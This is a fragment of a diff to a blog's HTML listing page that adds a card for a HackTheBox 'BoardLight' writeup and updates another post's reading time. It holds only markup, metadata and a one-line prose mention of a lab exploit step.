                           <a href="/tag/hack-the-box/" class="article__tag">Hack The Box</a>
+                        
+                      </span>
+                      
+                    </div>
+                  </div>
+
+                </div>
+
+              </div>
+            </div>
+
+            
+                
+              
+            
+            
+            
+
+            
+
+            
+
+            <div class="article col col-4 col-d-6 col-t-12 grid__post">
+              <div class="article__inner">
+
+                
+                <a class="article__image" href="/2024/08/02/writeup-hackthebox-boardlight/">
+                  <img class="lazy" data-src="/images/cover/09.jpg" alt="[WriteUp] HackTheBox - BoardLight">
+                </a>
+                
+
+                <div class="article__content">
+
+                  <div class="article__meta">
+                    <span class="article__minutes">
+                      
+                      
+                        2 min read
+                      
+                      <time class="article__date"
+                        datetime="2024-08-02T14:19:00+08:00">Aug 2, 2024</time>
+                    </span>
+                  </div>
+
+                  <h1 class="article__title">[WriteUp] HackTheBox - BoardLight</h2>
+
+                  <p class="article__excerpt">BoardLight is a simple difficulty box on HackTheBox, It is also the OSCP like box.</p>
+
+                  <div class="article__bottom">
+
+                    
+                    <div class="article__author">
+                      <a href="/about/" aria-label="b0rgch3n"><img class="article__author-image lazy" data-src="/images/author.jpg" alt="b0rgch3n's Picture"></a>
+                    </div>
+                    
+
+                    <div class="article__bottom-meta">
+                      
+                        <a href="/about/" class="article__author-link">b0rgch3n</a>
+                      
+                      
+                      <span>in</span>
+                      <span class="article-tags">
+                        
+                          <a href="/tag/writeup/" class="article__tag">WriteUp</a>
+                        
+                          <a href="/tag/hack-the-box/" class="article__tag">Hack The Box</a>
+                        
+                          <a href="/tag/oscp-like/" class="article__tag">OSCP like</a>
                         
                       </span>
                       
@@ -920,7 +893,7 @@ Then, listen using <b>nc</b>, and execute the <b>NOPASSWD sudo</b> exploit.</p>
           <span class="article__minutes">
             
             
-              4 min read
+              5 min read
             
           </span>
           <time class="article__date"
